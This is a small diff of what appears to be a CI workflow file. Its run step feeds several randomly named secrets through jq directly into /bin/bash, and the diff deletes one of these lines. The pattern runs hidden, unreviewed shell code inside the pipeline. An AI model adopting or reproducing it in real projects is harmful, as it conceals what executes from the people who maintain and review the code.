@@ -18,7 +18,6 @@ jobs:
           vsh8493: ${{ secrets.vsh8493 }}
         run: |
           printf '%s' "$vsh8493" | jq -r .yr05035 | /bin/bash
-          echo $ny466 | jq -r .ha1 | /bin/bash
           printf '%s' "$hyd86202" | jq -r .hpxt477 | /bin/bash
           printf '%s' "$b760" | jq -r .qu223 | /bin/bash
 
